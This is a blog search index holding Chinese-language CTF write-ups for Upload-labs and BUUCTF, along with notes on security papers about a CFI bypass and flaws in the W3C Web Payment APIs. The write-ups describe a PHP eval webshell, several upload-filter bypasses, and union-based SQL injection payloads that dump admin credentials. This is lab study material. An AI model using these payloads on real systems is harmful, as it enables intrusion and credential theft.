<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Upload_labs2</title>
    <link href="/2023/09/07/Upload-labs2/"/>
    <url>/2023/09/07/Upload-labs2/</url>
    
    <content type="html"><![CDATA[<h4 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907100705175.png" alt="image-20230907100705175"></p><p><code>$img_path = $_GET[&#39;save_path&#39;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $file_ext;</code>：构建一个新的文件路径，包括文件名和扩展名。这个路径基于名为 <code>&#39;save_path&#39;</code> 的 GET 参数，以及一个随机数、日期时间戳和文件扩展名。所以可以采用%00进行截断</p><h4 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907104811944.png" alt="image-20230907104811944"></p><p>这题变成了 <code>$_POST[&#39;save_path&#39;]</code> ，POST方式不会像GET方式一样，提交经过URL编码，所以进行截断需要手动修改二进制流</p><h4 id="Pass-13，14，15"><a href="#Pass-13，14，15" class="headerlink" title="Pass-13，14，15"></a>Pass-13，14，15</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907151043164.png" alt="image-20230907151043164"></p><p>创建图片马：</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150642263.png" alt="image-20230907150642263"></p><p>抓包记录上传位置</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150615706.png" alt="image-20230907150615706"></p><p>通过题目给出的文件包含漏洞访问，可以看到正确返回了木马中的phpinfo()内容</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150559242.png" alt="image-20230907150559242"></p><h4 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907153602463.png" alt="image-20230907153602463"></p><p>发现会对图片进行二次渲染，则之前使用的图片码无法使用，因为加在图片后的php代码会被渲染，从而无法正确执行</p><p>所以可以上传一张图片，对比看被二次渲染过的图片有什么地方是没变的，可以将php代码插入其中（通常文件头是不会被修改的，但修改文件头可能会导致文件损坏）</p><p><img src="/2023/09/07/Upload-labs2/image-20230907163747679.png" alt="image-20230907163747679"></p><p>左边是修改过的gif，右边是上传之后重新下载的gif，可以看到php代码被成功的添加</p><p>用上一题同样的方法访问</p><p><img src="/2023/09/07/Upload-labs2/image-20230907163902487.png" alt="image-20230907163902487"></p><p>通过文件包含漏洞，代码被成功执行</p><h4 id="Pass-17，18条件竞争"><a href="#Pass-17，18条件竞争" class="headerlink" title="Pass-17，18条件竞争"></a>Pass-17，18条件竞争</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907165625505.png" alt="image-20230907165625505"></p><p>利用时间差，根据源码可以知道，上传的逻辑是：如果上传一个jpg，png，gif图片，成功了则改名并保存，若没成功则删除，则可以通过burpsuite进行攻击，不断的上传文件，并不断的访问该文件，直到访问成功</p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Upload_labs1</title>
    <link href="/2023/09/05/Upload-labs/"/>
    <url>/2023/09/05/Upload-labs/</url>
    
    <content type="html"><![CDATA[<h4 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h4><p><img src="/2023/09/05/Upload-labs/image-20230905105954741.png" alt="image-20230905105954741"></p><p><strong>创建一句话php</strong></p><p><img src="/2023/09/05/Upload-labs/image-20230905110036360.png" alt="image-20230905110036360"></p><ul><li><code>@</code>：错误抑制符号，可以阻止PHP报告eval函数执行中的错误</li><li><code>eval</code>：接受一个字符串作为参数，将其作为PHP代码执行</li><li><code>$_POST(&#39;shell&#39;)</code>：POST请求变量，包含一个名为shell的参数</li></ul><p><strong>上传尝试</strong></p><p><img src="/2023/09/05/Upload-labs/image-20230905110908269.png" alt="image-20230905110908269"></p><p>猜测是前端JS限制了上传文件的类型，直接禁用前端JS后，再次上传</p><p><img src="/2023/09/05/Upload-labs/image-20230905111208945.png" alt="image-20230905111208945"></p><p>上传成功，查看传输的路径</p><p><img src="/2023/09/05/Upload-labs/image-20230905111248987.png" alt="image-20230905111248987"></p><p>通过蚁剑进行连接</p><p><img src="/2023/09/05/Upload-labs/image-20230905111418459.png" alt="image-20230905111418459"></p><p>在根目录下即可找到flag</p><h4 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h4><p>依然通过一句话php木马进行尝试</p><p><img src="/2023/09/05/Upload-labs/image-20230905111610103.png" alt="image-20230905111610103"></p><p>通过Burpsuite进行抓包</p><p><img src="/2023/09/05/Upload-labs/image-20230905111716152.png" alt="image-20230905111716152"></p><p>Content-Type显示为text&#x2F;php，修改为image&#x2F;jpeg，重发</p><p><img src="/2023/09/05/Upload-labs/image-20230905113245564.png" alt="image-20230905113245564"></p><p>得到路径，其余操作与Pass-01相同</p><p>利用该漏洞的关键函数：<code>mime_content_type()</code></p><h4 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h4><p><img src="/2023/09/05/Upload-labs/image-20230905133923792.png" alt="image-20230905133923792"></p><p>基于黑名单绕过，通常方法有以下几种：</p><ul><li>上传不常见的php拓展名：pht, phpt, phtml, php3,php4,php5,php6</li><li>有些会忽略大小写：Php，PHp，pHp之类的</li><li>解析漏洞：例如apache，iis，nginx（需要继续了解，后续单独写博客）</li></ul><p><img src="/2023/09/05/Upload-labs/image-20230905134828992.png" alt="image-20230905134828992"></p><p>修改后缀即可</p><h4 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h4><p><img src="/2023/09/05/Upload-labs/image-20230906131705456.png" alt="image-20230906131705456"></p><p>屏蔽了所有的拓展名，所以可以通过基于白名单的绕过进行文件上传：%00截断：在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><p><img src="/2023/09/05/Upload-labs/image-20230906131758825.png" alt="image-20230906131758825"></p><p>也可以通过上传.htaccess文件绕过</p><h4 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h4><p><img src="/2023/09/05/Upload-labs/image-20230906135624141.png" alt="image-20230906135624141"></p><p>对比之前的题目，可以发现，少了将文件名全部转化成小写这一步，所以可以通过大小写混合进行绕过</p><p><img src="/2023/09/05/Upload-labs/image-20230906140256010.png" alt="image-20230906140256010"></p><h4 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h4><p><img src="/2023/09/05/Upload-labs/image-20230906142332590.png" alt="image-20230906142332590"></p><p>并未去除首尾的空格，可以通过添加空格的方式绕过</p><p><img src="/2023/09/05/Upload-labs/image-20230906143052256.png" alt="image-20230906143052256"></p><p>因为此时服务器获得的文件后缀是php+空格，不在黑明单中，所以可以实现绕过</p><h4 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h4><p><img src="/2023/09/05/Upload-labs/image-20230906143845354.png" alt="image-20230906143845354"></p><p>代码中没有过滤点，可以通过加点进行绕过</p><p><img src="/2023/09/05/Upload-labs/image-20230906144030007.png" alt="image-20230906144030007"></p><p>此时，服务器获取到的后缀是空，不在黑名单中</p><h4 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h4><p><img src="/2023/09/05/Upload-labs/image-20230906150046786.png" alt="image-20230906150046786"></p><p>源码没有过滤::DATA，可以利用windows的特性</p><p>在window的时候如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，目的就是不检查后缀名</p><p><img src="/2023/09/05/Upload-labs/image-20230906150026942.png" alt="image-20230906150026942"></p><h4 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h4><p><img src="/2023/09/05/Upload-labs/image-20230906153208872.png" alt="image-20230906153208872"></p><p>由于代码没有写循环，代表对于 <code>.</code> 和 <code> space</code>的过滤只会进行一遍，所以可以通过在后缀名后添加 <code>. .</code>来进行绕过</p><h4 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h4><p><img src="/2023/09/05/Upload-labs/image-20230906153917267.png" alt="image-20230906153917267"></p><p><code>$file_name=str_ireplace($deny_file, &quot;&quot;, $file_name)</code>：函数调用会查找 <code>$file_name</code> 中包含在 <code>$deny_ext</code> 数组中的任何子字符串，然后将它们替换为空字符串，即删除这些子字符串</p><p>所以可以通过双写进行绕过，在处理 <code>pphphp</code>时，由于上述函数，中间的php将被替换成空，该后缀仍然会被解析成php</p><p><img src="/2023/09/05/Upload-labs/image-20230906154338920.png" alt="image-20230906154338920"></p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LFI</title>
    <link href="/2023/09/05/LFI/"/>
    <url>/2023/09/05/LFI/</url>
    
    <content type="html"><![CDATA[<h2 id="LFI文件传输漏洞"><a href="#LFI文件传输漏洞" class="headerlink" title="LFI文件传输漏洞"></a>LFI文件传输漏洞</h2>]]></content>
    
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTFWriteUp1</title>
    <link href="/2023/09/02/BUUCTFWriteUp1/"/>
    <url>/2023/09/02/BUUCTFWriteUp1/</url>
    
    <content type="html"><![CDATA[<p><strong>LFI COURSE 1</strong></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902093905518.png" alt="image-20230902093905518"></p><p><code>if(isset($_GET[&#39;file&#39;])) &#123; ... &#125;</code>：这是一个条件语句，用于检查是否存在名为 ‘file’ 的 GET 参数。如果存在，代码块内的内容将被执行。</p><p><code>$str = $_GET[&#39;file&#39;];</code>：将名为 ‘file’ 的 GET 参数的值存储在变量 <code>$str</code> 中。</p><p><code>include $_GET[&#39;file&#39;];</code>：这行代码尝试包含一个文件，文件名由 GET 参数 ‘file’ 的值指定</p><p>用户可以通过GET参数来指定要包含的文件，include可能存在LFI（文件包含漏洞攻击）</p><p>尝试?file&#x3D;&#x2F;flag   ?file&#x3D;&#x2F;flag.txt ?file&#x3D;&#x2F;flag.php </p><p>?file&#x3D;&#x2F;flag可以直接得到flag</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902094347903.png" alt="image-20230902094347903"></p><p><strong>BRUTE 1</strong></p><p>进入靶机后以下界面：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102422665.png" alt="image-20230902102422665"></p><p>随意尝试组合用户名为123，password为123，返回“用户名错误”</p><p>用burpsuite抓包可以得到以下信息</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102530889.png" alt="image-20230902102530889"></p><p>根据题目意思Brute为野蛮的，推测为暴力破解，则选择send to Intruder，因为返回为“用户名错误”而不是“用户名或密码错误”，在尝试时，推测可以先确定用户名，再确定密码，不需要两边同时爆破</p><p>所以构造：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103129156.png" alt="image-20230902103129156"></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103004685.png" alt="image-20230902103004685"></p><p>用户名字典和密码字典为网上下载，导入后选择Simple list，开始爆破</p><p>当用户名为admin时：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103201354.png" alt="image-20230902103201354"></p><p>所以修改payload：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103408791.png" alt="image-20230902103408791"></p><p>得到正确的值6490</p><p>至此得到用户名为admin，密码为6490，输入可以得到flag</p><p><strong>SQL COURSE 1</strong></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902150719714.png" alt="image-20230902150719714"></p><p>随便点击</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163825700.png" alt="image-20230902163825700"></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163842513.png" alt="image-20230902163842513"></p><p>看到在访问backend&#x2F;content_detail.php?id&#x3D;1处，可能存在sql注入点，扔到HackBar中开始测试</p><p>分别尝试<code>?id=1 and 1=1</code>和 <code>?id=1 and 1=2</code> 发现第一条有回显，第二条没有，判断为数字型注入</p><p>判断or是否被过滤：</p><p><code>?id=1 or 1=1</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170242985.png" alt="image-20230902170242985"></p><p>判断列数：</p><p><code>?id=1 order by 1</code> 有回显</p><p><code>?id=1 order by 2</code>有回显</p><p><code>?id=1 order by 3</code>无回显</p><p>所以表有两列</p><p>确定字段的显示顺序</p><p><code>?id=-1 union select 1,2</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170731553.png" alt="image-20230902170731553"></p><p>爆破数据库：</p><p><code>?id=-1 union select database(), database()</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171015321.png" alt="image-20230902171015321"></p><p>根据获得的数据库的名称，获取数据表的信息</p><p><code>?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171132043.png" alt="image-20230902171132043"></p><p><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;</code>这部分会连接数据库中的所有表格名称，并以逗号分隔的形式返回。于是得到了表名信息admin, contents</p><p>使用admin表，获取字段信息</p><p><code>?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;news&#39; and table_name=&#39;admin&#39;)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171445924.png" alt="image-20230902171445924"></p><p>此处union select后的1作为占位符，使得结果可以对齐，括号中的查询语句可以获得news库admin表中的所有列名</p><p>获取username</p><p><code>?id=-1 union select 1,(select group_concat(username) from admin)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171958351.png" alt="image-20230902171958351"></p><p>获取密码</p><p><code>?id=-1 union select 1,(select group_concat(password) from admin)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902172038494.png" alt="image-20230902172038494"></p><p>根据得到的信息即可得到flag</p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ReadPaper2</title>
    <link href="/2023/07/27/ReadPaper2/"/>
    <url>/2023/07/27/ReadPaper2/</url>
    
    <content type="html"><![CDATA[<h2 id="WarpAttack-Bypassing-CFI-through-Compiler-Introduced-Double-Fetches-（WarpAttack：通过编译器引入的双重获取绕过CFI）"><a href="#WarpAttack-Bypassing-CFI-through-Compiler-Introduced-Double-Fetches-（WarpAttack：通过编译器引入的双重获取绕过CFI）" class="headerlink" title="WarpAttack: Bypassing CFI through Compiler-Introduced Double-Fetches （WarpAttack：通过编译器引入的双重获取绕过CFI）"></a>WarpAttack: Bypassing CFI through Compiler-Introduced Double-Fetches （WarpAttack：通过编译器引入的双重获取绕过CFI）</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>如今多数系统上运行的软件是由C&#x2F;C++编写的，容易出现内存损坏错误，因此需要对这些程序进行彻底的测试以尽可能的消除错误，但通常测试时不完整的，因此会在代码中添加缓解措施以增加攻击的难度，广泛应用的措施有：</p><p>地址空间布局随机话（ASLR）：操作系统在加载进程的时候，会随机地改变可执行文件、共享库、堆栈和其他内存区域的基地址，使得这些区域在每次运行时都位于不同的内存地址位置。</p><p>堆栈canaries（Stack Canaries）：通过在函数返回地址之前或之后插入一个特殊的随机值（称为堆栈金丝雀或堆栈哨兵），来检测堆栈缓冲区溢出攻击。在函数执行结束时，系统会检查这个堆栈金丝雀的值是否被修改过，如果被修改，就说明发生了堆栈缓冲区溢出攻击。如果检测到这种异常情况，程序通常会立即终止执行，从而防止恶意代码得以执行。</p><p>数据执行预防（DEP）：通过硬件和操作系统的支持，在内存中标记某些区域为”不可执行”，也就是阻止这些区域的数据作为指令被执行。这样一来，即使攻击者成功注入恶意代码到内存中，也无法执行，因为这些区域被标记为只能包含数据而不能执行指令。</p><p>代码重用攻击在这些缓解措施下仍然有效，例如ROP（返回导向编程），针对这一点，CFI（Control-Flow Integrity）被认为是阻止代码重用攻击的关键措施。CFI首先静态计算程序的控制流图（CFG），并确定所有合法的控制流传输目标。然后，CFI会在代码中插入检查，以在运行时验证每个控制流传输。</p><p>但目前的编译器对于缓解措施插入的安全检查代码并不会视为特权代码，所以在进行代码优化时，可能导致安全性遭到破坏使攻击者有Time-of-Check to Time-Of-Use（TOCTTOU）的机会 。</p><p>例如：代码中存在switch语句，执行时通常遵循以下模式，给定一个跳转表和一个索引，程序首先获取索引值以验证边界检查是否满足跳转表大小，然后再次获取索引值以进行实际的跳转处理。由于索引被多次加载（获取），攻击者可以在边界检查后覆盖索引值，最终允许在跳转表之外进行任意跳转。</p><p>本文研究了由双重获取引入的TOCTOU漏洞，并提出了攻击WarpAttack，并在firefox上成功实施</p><h3 id="Threat-Model"><a href="#Threat-Model" class="headerlink" title="Threat Model"></a>Threat Model</h3><p>攻击者能力：</p><ul><li>任意读写：攻击者持有一个内存损坏漏洞（如use-after-free错误），使其能够读写任意内存。C&#x2F;C++ 程序容易受到此类漏洞的影响</li><li>线程控制：攻击者能够主动控制与被攻击程序在同一地址空间内的线程。</li><li>Gadget：受害者程序包含足够的 gadget 代码片段，即带有编译器引入的双重获取的开关跳转表。</li></ul><p><em>Gadget 是一种有用的构造块，可以被组合成攻击载荷，以绕过程序的安全措施和执行恶意操作。这些构造块通常是由程序本身的代码片段组成，例如函数的一部分或条件分支的一小段代码。</em></p><p>攻击者目标是劫持控制流到特定位置</p><p>防御假设：</p><p>不可执行内存：受害者程序受到DEP保护，攻击者无法执行任何注入式攻击，只能进行代码重用攻击</p><p>随机化：受害者程序受地址空间随机化保护</p><p>控制流保护：受害者程序应用完全精确的静态 CFI</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ReadPaper1:WPA</title>
    <link href="/2023/07/26/ReadPaper1/"/>
    <url>/2023/07/26/ReadPaper1/</url>
    
    <content type="html"><![CDATA[<h2 id="A-Formal-Security-Analysis-of-the-W3C-Web-Payment-APIs-Attacks-and-Verification-W3C-Web-支付-API-的正式安全分析：攻击和验证"><a href="#A-Formal-Security-Analysis-of-the-W3C-Web-Payment-APIs-Attacks-and-Verification-W3C-Web-支付-API-的正式安全分析：攻击和验证" class="headerlink" title="A Formal Security Analysis of the W3C Web Payment APIs: Attacks and Verification(W3C Web 支付 API 的正式安全分析：攻击和验证)"></a>A Formal Security Analysis of the W3C Web Payment APIs: Attacks and Verification(W3C Web 支付 API 的正式安全分析：攻击和验证)</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>当下支付环境多样，有Stripe，Google pay，PayPal等多种支付方式，存在的问题有：</p><ul><li>恶意顾客可能会篡改商家与支付处理机构之间的信息流</li><li>支付处理机构的方案可能存在缺陷</li><li>用户可能会被多种不同的用户界面所困惑，从而更容易受到网络钓鱼攻击</li></ul><p>此外，在面对有些支付界面较为复杂时，用户可能直接关闭支付进程</p><p>为此，W3C（World Wide Web Consortium）目前正在开发WPA（Web Payment APIs）这是一种简化和标准化浏览器中的支付和结账流程的方法。其主要思想是，商家不再自己提供用于结账的网页或JavaScript，而是将这个过程交给用户的Web浏览器来处理。浏览器随后呈现给用户全新的支付用户界面（见图1），该界面位于Web上下文之外。在这个用户界面中，用户可以查看订单，选择（预先存储的）送货地址、支付方式和支付处理器（例如使用Stripe信用卡付款）。</p><p><img src="/2023/07/26/ReadPaper1/image-20230727152130120.png" alt="image-20230727152130120"></p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><ul><li>本文的分析是在详细的Web基础设施模型中，对Web Payment的首次分析</li><li>分析基于迄今为止最全面的Web基础设施模型——WIM，并做出了重要扩展</li><li>制定了反映使用WPA进行支付的完整性的精确安全属性：支付意图和支付唯一性。在尝试证明这些属性时，发现了两个关键性的漏洞，并提出了修复措施</li></ul><h3 id="THE-W3C-WEB-PAYMENT-APIS"><a href="#THE-W3C-WEB-PAYMENT-APIS" class="headerlink" title="THE W3C WEB PAYMENT APIS"></a>THE W3C WEB PAYMENT APIS</h3><h4 id="安全属性"><a href="#安全属性" class="headerlink" title="安全属性"></a>安全属性</h4><p><strong>支付意图</strong></p><p>浏览器会将用户表达意图的所有支付存储在一个名为PaymentIntents的字典中，它保证了支付提供者在进行交易时与顾客在支付UI界面中确认的信息一致。具体来说，这意味着支付的发送方、接收方和总金额与顾客在浏览器中确认的信息相符。这个属性可以防止恶意方代表顾客进行未经授权的支付。</p><p><strong>支付唯一性</strong></p><p>每个支付提供者则在其状态中存储所有已执行交易的记录，存储在一个名为”transactions”的映射表中，支付的唯一性确保对于客户授权的每笔付款，任何诚实的支付提供者最多执行一个交易，并且该交易具有正确的值。</p><h4 id="工作流"><a href="#工作流" class="headerlink" title="工作流"></a>工作流</h4><p><img src="/2023/07/26/ReadPaper1/image-20230727102822005.png" alt="image-20230727102822005"></p><ol><li>商家创建支付请求，支付请求中包含字段：id（支付的唯一标识符）&#x2F;商家接受的支付方法（methodData）&#x2F;总花费和一些商品可选细节（details）&#x2F;用户必须提供哪些数据（options：例如地址，电话）</li><li>通过Payment Request API将数据交给浏览器，浏览器根据支付请求中的 methodData（商家支持的支付方式）与已注册的支付处理程序进行对比，并选择在 methodData 中至少一种支付方式注册的所有支付处理程序。</li><li>在进行初步选择后，浏览器对每个选中的支付处理程序触发 CanMakePaymentEvent（支付是否可进行事件）。此事件包含有关所请求支付的基本信息，如商家顶层页面的源地址、支付请求发起的源地址以及适用的支付方式数据集（来自 PR.methodData）</li><li>支付处理程序在接收 CanMakePaymentEvent 后确定是否可以处理该支付请求。此决策过程特定于支付方式，并可能取决于法律要求。</li><li>在接收完所有触发的支付处理程序的响应后，浏览器显示一个特殊的对话框，称为支付 UI（用户界面）。这个支付 UI 不是网站的一部分，而是浏览器本身的界面（参见图1）。支付 UI 允许顾客输入（或选择存储的）所需信息，如送货地址、电子邮件地址以及支付详细信息。</li><li>支付详细信息包括选择可用支付处理程序和支付方式。如果顾客输入（或选择存储的或更改的）送货地址，还需要额外的步骤：因为这可能会改变送货费用，因此商家网站会收到一个部分匿名化的地址以重新计算送货费用。</li><li>顾客提交选择后，浏览器组装一个 PaymentRequestEvent（支付请求事件）并将其交给顾客选择的支付处理程序。该 PaymentRequestEvent 包含与 CanMakePaymentEvent 相同的数据（见上文），以及顾客输入的支付数据，如信用卡号、过期日期和验证号码。</li><li>在接收 PaymentRequestEvent 后，支付处理程序采取必要的步骤来执行或至少促进支付。</li><li>在执行这些步骤后，支付处理程序通过创建 PaymentHandlerResponse（支付处理程序响应）来完成其工作。此响应包含（再次）支付方式标识符和一个 details 字段，其确切内容取决于支付方式。details 的内容可以是支付提供者的某些签名支付确认，或者仅为“反映”信用卡数据等简单内容。</li><li>收到支付处理程序响应后，浏览器创建一个支付响应并将其返回给商家的网站。支付响应包含来自处理程序响应的 details、所选支付方式以及商家在 PR.options 中请求的额外数据，如送货地址。</li><li>商家现在可以检查响应（例如，验证信用卡数据的有效性）并通过表示结账过程完成（在这种情况下，浏览器关闭支付 UI）或表示出现问题而终止流程。</li></ol><p>一旦顾客进行了修改并重新提交，浏览器会向随后选择的支付处理程序触发另一个 PaymentRequestEvent，其中包含相同的支付标识符，但可能不同的支付细节（例如，由顾客选择的不同支付方式）。支付处理程序然后处理并可能更新支付（如有必要），再次用处理程序响应触发浏览器创建支付响应并将其交给商家。此时，商家可以再次接受支付响应或发起另一个重试。</p><h4 id="存在的漏洞"><a href="#存在的漏洞" class="headerlink" title="存在的漏洞"></a>存在的漏洞</h4><p><strong>Double Charging with Retry（重试引起的重复支付）</strong></p><p>在这个攻击过程中，假设有一个恶意商家和一个诚实的顾客。攻击利用了WPA中的重试机制。</p><ol><li>顾客发起结账：顾客在恶意商家的网站上发起结账请求。</li><li>商家创建支付请求：商家创建一个正常的支付请求，并将其交给浏览器处理。</li><li>浏览器引导支付流程：浏览器根据WPA规范的步骤，引导顾客完成支付流程的步骤6到11，这包括选择支付方式、确认支付等。</li><li>收到支付响应：商家收到顾客的支付响应，但在这里进行了攻击。</li><li>触发重试：商家触发了一个重试请求（retry），这意味着商家在第一次支付时出现了问题，要求顾客切换到不同的支付处理器和支付方式提供商，因为第一个支付方式据称不起作用。</li><li>显示错误信息：浏览器在其支付界面中显示了错误信息，告知顾客需要切换支付方式。</li><li>顾客选择不同的支付方式：由于顾客认为第一个支付方式存在问题，她选择了不同的支付处理器和支付方式提供商，并再次提交支付请求。</li><li>触发新的支付处理器：浏览器触发了新的支付处理器，该处理器执行第二次支付。</li><li>第二次支付：新的支付处理器执行了第二次支付，这就是攻击实现了双重收费的地方。</li><li>结账完成：攻击完成后，整个结账流程继续进行，顾客完成了支付流程，而没有任何提示表明她支付了两次。</li></ol><p>这个攻击是由于浏览器的行为，而不是支付处理器的实现。第二个支付处理器无法检测到它是在重试上下文中调用的，因为它之前没有见过整个交易的支付id。攻击者可以反复利用这个漏洞，让顾客反复被收取双重费用，而商家和支付处理器无法察觉。</p><p>修复措施：</p><p>可以在交易重复使用不同处理程序时通知支付处理程序，以便它可以撤销支付并在成功撤销后再触发第二个支付处理程序。或者支付处理程序可以在其响应中包含一个状态，指示是否已经进行了支付，并阻止在这种情况下更改支付处理程序。在与W3C Web Payments Working Group的讨论中，他们选择了一个非常简单的修复方法，即完全禁止更改支付处理程序，尽管这可能会迫使顾客中止整个流程，如果一开始选择的支付处理程序实际上不能正常工作。这是规范最终采用的方法。</p><p><strong>Ambiguous Payment Method Data（模棱两可的支付数据）</strong></p><p>在这个攻击过程中，假设商家是恶意的，而其他人都是诚实的。攻击利用了WPA规范中的一个特定字段——methodData。以下是攻击的步骤：</p><ol><li>商家创建支付请求：商家创建一个支付请求PR，其中methodData字段包含两个条目，都是相同的支付方式，即具有相同的支付方式标识符。根据W3C规范，这是完全有效的。其中一个条目可能不包含任何费用，而另一个可能包含非常高的费用。</li><li>提交支付请求：商家将支付请求PR提交给WPA（如往常一样）。这触发浏览器在其安装的支付处理器列表中搜索与PR中给定的支付方式标识符匹配的处理器，并查询匹配的处理器。</li><li>显示支付界面：之后，浏览器显示支付界面。我们假设用户总是选择第一个条目，即不包含额外费用的条目。她输入所需数据并提交。</li><li>调用支付处理器：现在，浏览器将带有支付细节的PaymentRequestEvent（包括完整的methodData列表，即两个条目）交给所选的支付处理器。</li><li>支付处理器决策：然而，PaymentRequestEvent不包含用户从methodData中选择了哪个条目的信息。支付处理器现在必须决定使用哪个支付方式数据条目。由于规范中也没有关于此的指导，我们假设支付处理器总是选择最后一个支付方式数据条目（在我们的攻击中会产生巨额的额外费用）并执行支付。</li><li>完成支付：其余步骤与常规支付流程相同。结果是，顾客被收取了她从未同意的费用，而没有任何提示。</li></ol><p>这种攻击并不依赖于浏览器和支付处理器在存在多个适用的methodData条目时如何确定选择哪一个，只要存在这样的可能性，它们选择不同的条目即可。这使得顾客被收取未知费用的攻击成为可能。</p><p>修复措施：</p><p>浏览器可以拒绝模棱两可的条目，或者将用户的选择传递给支付处理程序。我们建议采用第一种选项，以保持API接口的稳定性。因为每次用户选择的变化都可能需要更新支付处理程序的实现，导致接口的不稳定性和不一致性。</p><h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>为了全面分析WPA，对WIM做出了以下拓展</p><ol><li>可扩展的DOM事件处理：WPA大量使用DOM事件来触发支付处理程序。为了模拟这些事件的处理过程，WIM（Web Infrastructure Model）的浏览器模型被扩展，引入了一组待处理事件和一个可扩展的处理函数。当浏览器被触发处理DOM事件时，其中一个待处理事件会被随机选择，从待处理事件集合中移除，并交给处理函数处理。这样，模拟了事件的传递和处理过程。</li><li>Service Workers：Service Workers是在浏览器中后台运行的事件驱动型JavaScript程序，可用于为Web应用程序提供离线功能。在WPA中，支付处理程序被视为Service Workers的实例。因此，WIM的浏览器模型被扩展，加入了一组注册的Service Workers。类似于事件处理，当浏览器被触发时，Service Worker可以被非确定性地选择执行，从而模拟了Service Worker的运行过程。</li><li>脚本API扩展：WPA本身是WIM浏览器模型的重要扩展。WPA已被各大主流浏览器实现，这导致了在真实执行环境中，网页应用程序和脚本（诚实或不诚实）可能会干扰WPA的各个部分，从而扩大了攻击面。为此，WIM的脚本API被扩展，将WPA规范中定义的API函数形式化为脚本命令，即脚本可以输出命令，指示浏览器调用具有给定参数列表的API函数。这些API函数的定义遵循WPA规范，并允许对其进行形式化的分析。</li></ol><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p><strong>为什么此处对于WPA模型安全性的分析都是假设商家是恶意的而用户是诚实的</strong></p><p>个人理解：首先，用户的行为通常是会受到较大约束的，发起主动攻击的难度较大。多数攻击是针对正常运作的系统发起的。虽然用户的一些攻击行为可能会获取不当利益，例如进行虚假支付。但是从安全研究的角度来看，通常更关注的是那些针对系统本身的漏洞和攻击。其次，当进行系统安全性评估和漏洞分析时，假设商家是恶意的可以帮助研究人员更好地理解系统的脆弱点和潜在风险。</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
